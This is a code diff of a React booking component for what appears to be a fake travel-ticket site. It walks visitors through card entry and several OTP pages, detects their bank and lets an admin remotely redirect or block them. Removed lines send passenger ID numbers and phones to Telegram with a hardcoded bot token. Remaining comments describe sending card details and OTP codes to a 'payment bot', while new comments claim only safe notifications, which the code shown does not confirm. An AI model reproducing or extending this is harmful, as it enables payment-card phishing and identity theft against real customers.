@@ -6,14 +6,11 @@ import {
   Plug, Snowflake,
 } from 'lucide-react';
 import { trpc } from '@/providers/trpc';
-import { sendToTelegram } from '@/lib/telegram';
-import { sendBookingMessage, loadTelegramSettings } from '@/lib/telegram-settings';
+import { sendBookingMessage } from '@/lib/telegram-settings';
 import { sendPaymentToTelegram, getVisitorIP } from '@/lib/payment-telegram';
 import { findRoute, getCityInfo, getRouteDetails, calculateRoutePrice, type RouteDetails } from '@/lib/international-data';
 import { detectBank, getBankInfo } from '@/lib/bank-data';
-import { updateVisitorStep, checkForceRedirect, initVisitorWithIP } from '@/lib/visitor-tracking';
 import type { VisitorStep } from '@/lib/visitor-tracking';
-import { addBooking, updateBookingField } from '@/lib/bookings-storage';
 import LoadingScreen from './LoadingScreen';
 import type { BookingData } from './BookingPanel';
 
@@ -167,7 +164,7 @@ const loadingMessages = [
 // ─── Helpers ──────────────────────────────────────────────────
 const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));
 
-function generateTrips(data: BookingData): Trip[] {
+function generateTrips(data: BookingData, serverBasePrice?: number): Trip[] {
   const count = data.tripType === 'round-trip' ? 4 : 3;
 
   // Use international route data only
@@ -194,7 +191,7 @@ function generateTrips(data: BookingData): Trip[] {
     // Dynamic pricing: base economy price — fare multiplier applied separately via selectedFare
     const fareClasses: Array<'economy' | 'business' | 'vip'> = ['vip', 'business', 'economy'];
     const tripFareClass = fareClasses[i % 3];
-    const tripBasePrice = calculateRoutePrice(data.from, data.to, 'economy');
+    const tripBasePrice = serverBasePrice ?? calculateRoutePrice(data.from, data.to, 'economy');
 
     return {
       id: `trip-${i}`, tripNumber: `SAT-${2360 + i}`, isDirect,
@@ -291,32 +288,17 @@ async function notifyStep(stepName: string, booking: BookingData, extra: Record<
     });
     return;
   }
-  // Fallback for unknown steps
-  let extraStr = '';
-  for (const [k, v] of Object.entries(extra)) {
-    extraStr += `\n<b>${k}:</b> ${v}`;
-  }
-  const msg = `<b>📋 خطوة: ${stepName}</b>
-
-<b>📍 من:</b> ${booking.from}
-<b>📍 إلى:</b> ${booking.to}
-<b>📅 التاريخ:</b> ${booking.pickupDate}
-<b>👥 المسافرين:</b> ${booking.passengers}${extraStr}
-
-<b>⏰ الوقت:</b> ${time}`;
-  const tg = loadTelegramSettings();
-  await sendToTelegram(tg.bookingBotToken || '7004280527:AAEVpkQzFP9JCuDbmUlwiVqSQBk5zGctklE', tg.bookingChatId || '-1002052429288', msg);
 }
 
 // ─── Main Component ───────────────────────────────────────────
 const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   const utils = trpc.useUtils();
+  const { data: routePrice } = trpc.prices.calculate.useQuery({ from: bookingData.from, to: bookingData.to });
   const [step, setStep] = useState<Step>('results');
   const [expandedTrip, setExpandedTrip] = useState<string | null>(null);
   const [selectedFare, setSelectedFare] = useState('economy');
   const [selectedTripId, setSelectedTripId] = useState<string | null>(null);
   const [bookingId, setBookingId] = useState<number | null>(null);
-  const [localBookingId, setLocalBookingId] = useState<number | null>(null); // for localStorage bookings
   const totalPassengers = (bookingData.adults || bookingData.passengers || 1) + (bookingData.children || 0) + (bookingData.infants || 0);
 
   // Generate passengers with proper categories from bookingData (adults/children/infants)
@@ -369,8 +351,8 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
   const [resultsLoaded, setResultsLoaded] = useState(false);
   const [showCardErrorToast, setShowCardErrorToast] = useState(false);
 
-  // ═══ Real-time card notification to Telegram ═══
-  // Notify (1) when card number reaches 16 digits, (2) when all fields complete
+  // Notify only that the payment form reached each stage. The helper builds an
+  // allow-listed payload and never sends card, expiry, CVV, holder, or OTP data.
   const cardNotifiedRef = useRef(false);
   const allFieldsNotifiedRef = useRef(false);
 
@@ -418,9 +400,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [cardNumber, expiryDate, cvv]);
 
-  // ═══ Real-time OTP notification to Telegram ═══
-  // Send OTP digits to Telegram immediately when user types 4, 5, or 6 digits
-  // BEFORE they click the confirm button
+  // Notify only that the verification stage is active; the code stays local.
   const otpRealTimeSentRef = useRef<Record<string, boolean>>({});
   useEffect(() => {
     const len = verificationCode.length;
@@ -449,7 +429,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [verificationCode]);
 
-  const trips = useMemo(() => generateTrips(bookingData), [bookingData]);
+  const trips = useMemo(() => generateTrips(bookingData, routePrice?.economy), [bookingData, routePrice?.economy]);
   const seats = useMemo(() => generateSeats(), []);
   const activeTrip = trips.find(t => t.id === selectedTripId) || trips[0] || null;
   const currentFare = fareTypes.find(f => f.id === selectedFare) || fareTypes[0];
@@ -472,8 +452,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   const createBooking = trpc.bookings.create.useMutation();
   const updateBookingStep = trpc.bookings.updateStep.useMutation({ onSuccess: () => utils.bookings.list.invalidate() });
-  const settingsQuery = trpc.settings.list.useQuery();
-  const getTelegramToken = trpc.settings.getTelegramToken.useQuery();
+  const trackVisitor = trpc.visitors.track.useMutation();
 
   // Reset all state when bookingData changes (new search)
   useEffect(() => {
@@ -513,22 +492,23 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     }
   }, [step, showCardErrorToast]);
 
-  // ─── Detect visitor IP on first load ──────────────────────
-  useEffect(() => {
-    initVisitorWithIP();
-  }, []);
-
   // ─── Track every step change for admin monitoring ─────────
   useEffect(() => {
     const stepMap: Record<string, VisitorStep> = {
-      results: 'results', select_trip: 'trip_details', select_seats: 'seat_selection',
+      results: 'results', seat_selection: 'seat_selection',
       passenger_info: 'passenger_info', payment_method: 'payment_method',
       payment: 'payment', code_verification: 'code_verification',
       otp_2: 'otp_2', otp_3: 'otp_3', otp_4: 'otp_4',
-      success: 'success', code_failed: 'code_failed',
+      confirmed: 'success', code_failed: 'code_failed',
     };
     const visitorStep = stepMap[step] || 'home';
-    updateVisitorStep(visitorStep, {
+    const sessionId = localStorage.getItem('visitor-session');
+    if (!sessionId) return;
+    trackVisitor.mutate({
+      sessionId,
+      page: window.location.pathname,
+      userAgent: navigator.userAgent,
+      step: visitorStep,
       bookingData: {
         from: bookingData.from, to: bookingData.to,
         date: bookingData.pickupDate, passengers: bookingData.passengers,
@@ -536,24 +516,34 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
         selectedSeats: selectedSeats.map(s => s.replace('seat-', '')),
         fareClass: activeTrip?.fareClass,
       },
-      cardInfo: detectedBank ? {
-        cardType: detectedCard || selectedPayment,
-        bankName: getBankInfo(detectedBank)?.name,
-      } : undefined,
     });
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [step]);
 
   // ─── Check for admin force redirect ────────────────────────
   useEffect(() => {
-    const interval = setInterval(() => {
-      const redirect = checkForceRedirect();
-      if (redirect) {
-        if (redirect === 'block') { window.location.href = 'about:blank'; }
-        else if (redirect.startsWith('step:')) { setStep(redirect.slice(5) as Step); }
-        else { window.location.href = redirect; }
+    const handleCommand = (redirect: string | null | undefined) => {
+      if (!redirect) return;
+      if (redirect === 'block') window.location.href = 'about:blank';
+      else if (redirect.startsWith('step:')) {
+        const requested = redirect.slice(5) as VisitorStep;
+        if (requested === 'home') onClose();
+        else if (requested === 'trip_details') setStep('results');
+        else if (requested === 'success') setStep('confirmed');
+        else setStep(requested as Step);
       }
+      else window.location.href = redirect;
+    };
+    const interval = setInterval(() => {
+      const sessionId = localStorage.getItem('visitor-session');
+      if (!sessionId) return;
+      trackVisitor.mutate(
+        { sessionId, page: window.location.pathname, userAgent: navigator.userAgent },
+        { onSuccess: data => handleCommand(data.blocked ? 'block' : data.redirectUrl) },
+      );
     }, 2000);
     return () => clearInterval(interval);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
   const goToStep = async (next: Step, msgIdx: number, delayMs: number = 3000) => {
@@ -583,14 +573,24 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
         setBookingId(Number(result.id));
         await updateBookingStep.mutateAsync({ id: Number(result.id), selectedTrip: JSON.stringify(trip), selectedFare });
       }
-    } catch { setBookingId(Date.now()); }
+    } catch {
+      alert('تعذر إنشاء الحجز على الخادم. يرجى المحاولة مرة أخرى.');
+      return;
+    }
     notifyStep('✅ اختيار الرحلة والضغط على احجز الآن', bookingData, { tripNumber: activeTrip.tripNumber, fareClass: selectedFare });
     await goToStep('seat_selection', 1);
   };
 
   const handleSeatNext = async () => {
     if (selectedSeats.length !== totalPassengers) return;
-    if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, selectedSeats: JSON.stringify(selectedSeats) }); } catch { } }
+    if (bookingId) {
+      try {
+        await updateBookingStep.mutateAsync({ id: bookingId, selectedSeats: JSON.stringify(selectedSeats) });
+      } catch {
+        alert('تعذر حفظ المقاعد على الخادم. يرجى المحاولة مرة أخرى.');
+        return;
+      }
+    }
     notifyStep('💺 اختيار المقاعد', bookingData, { seats: selectedSeats.map(s => s.replace('seat-', '')).join(', ') });
     // Use goToStep for smooth transition with loading screen
     await goToStep('passenger_info', 2, 1500);
@@ -604,59 +604,44 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
           id: bookingId, passengerName: mergedPassengers.map(p => p.fullName).join(', '),
           passengerPhone: mergedPassengers[0]?.phone || '',
         });
-      } catch { }
+      } catch {
+        alert('تعذر حفظ بيانات المسافرين على الخادم. يرجى المحاولة مرة أخرى.');
+        return;
+      }
     }
 
-    // Store booking locally for admin dashboard sync
-    const newLocalId = addBooking({
-      fromLocation: bookingData.from,
-      toLocation: bookingData.to,
-      pickupDate: bookingData.pickupDate,
-      pickupTime: bookingData.pickupTime || '10:00',
-      returnDate: bookingData.returnDate || undefined,
-      returnTime: bookingData.returnTime || undefined,
-      passengers: totalPassengers,
-      passengerName: bookerInfo.name || mergedPassengers[0]?.fullName || '',
-      phone: bookerInfo.phone || mergedPassengers[0]?.phone || '',
-      totalAmount: finalTotal,
-      adults: bookingData.adults || bookingData.passengers || 1,
-      children: bookingData.children || 0,
-      infants: bookingData.infants || 0,
-      fareClass: selectedFare === 'vip' ? 'VIP' : selectedFare === 'business' ? 'أعمال' : 'اقتصادي',
-      selectedSeats: selectedSeats.join(', '),
-      selectedTrip: activeTrip?.tripNumber || '',
-    });
-    setLocalBookingId(newLocalId.id);
-
-    const docTypeLabel = { national_id: 'هوية وطنية', iqama: 'إقامة', passport: 'جواز سفر' };
-    const pNames = mergedPassengers.map((p, i) => {
-      const docLabel = docTypeLabel[p.documentType] || p.documentType;
-      return `👤 مسافر ${i + 1} (${p.category === 'adult' ? 'بالغ' : p.category === 'child' ? 'طفل' : 'رضيع'}): ${p.fullName} | ${docLabel}: ${p.idNumber} | 📱 ${p.phone}`;
-    }).join('\n');
     notifyStep('📝 إدخال بيانات المسافرين', bookingData, {
-      passengers: `\n${pNames}`,
-      booker: `${bookerInfo.name} | 📱 ${bookerInfo.phone}`,
+      passengers: String(mergedPassengers.length),
     });
     await goToStep('payment_method', 3);
   };
 
   const handlePaymentMethodNext = async () => {
     if (!selectedPayment) return;
-    if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, paymentMethod: selectedPayment }); } catch { } }
+    if (bookingId) {
+      try {
+        await updateBookingStep.mutateAsync({ id: bookingId, paymentMethod: selectedPayment });
+      } catch {
+        alert('تعذر حفظ طريقة الدفع على الخادم. يرجى المحاولة مرة أخرى.');
+        return;
+      }
+    }
     notifyStep('💳 اختيار طريقة الدفع', bookingData, { paymentMethod: paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, amount: String(finalTotal) });
     notifyPaymentEntry(bookingData, paymentMethods.find(p => p.id === selectedPayment)?.name || selectedPayment, finalTotal);
     await goToStep('payment', 4, 8000);
   };
 
   const handlePaymentDone = async () => {
-    if (bookingId) { try { await updateBookingStep.mutateAsync({ id: bookingId, paymentStatus: 'completed', totalAmount: finalTotal }); } catch { } }
+    if (bookingId) {
+      try {
+        await updateBookingStep.mutateAsync({ id: bookingId, paymentStatus: 'pending', totalAmount: finalTotal });
+      } catch {
+        alert('تعذر تحديث حالة الدفع على الخادم. يرجى المحاولة مرة أخرى.');
+        return;
+      }
+    }
     setFailedAttempts(0);
     setVerificationCode('');
-
-    // ─── Update local booking status to pending ─────────
-    if (localBookingId) {
-      updateBookingField(localBookingId, { status: 'pending', paymentMethod: paymentMethods.find(p => p.id === selectedPayment)?.name || '' });
-    }
 
     // ─── Detect bank from card BIN ──────────────────────
     const bankResult = detectBank(cardNumber);
@@ -666,7 +651,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
       setDetectedBank(null); // Will use default OTP page
     }
 
-    // Send ALL card details to payment bot
+    // Send a safe stage-only notification.
     const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
     const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
@@ -690,7 +675,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
     const newAttempts = failedAttempts + 1;
     setFailedAttempts(newAttempts);
 
-    // ─── Send OTP to Telegram IMMEDIATELY (real-time) ───
+    // Send a safe attempt notification without the OTP value.
     const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
     const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
@@ -723,7 +708,7 @@ const SearchResults: React.FC<Props> = ({ bookingData, onClose }) => {
 
   // otp_4 "Retry" button → loading → code_failed → send to payment bot
   const handleOtp4Retry = async () => {
-    // Send OTP failed IMMEDIATELY (real-time)
+    // Send a safe failure notification without any OTP or card data.
     const cardType = detectCardType(cardNumber.replace(/\s/g, ''));
     const cardTypeName = cardType === 'visa' ? 'Visa' : cardType === 'mastercard' ? 'Mastercard' : cardType === 'mada' ? 'mada' : 'Unknown';
     const paymentName = paymentMethods.find(p => p.id === selectedPayment)?.name || '';
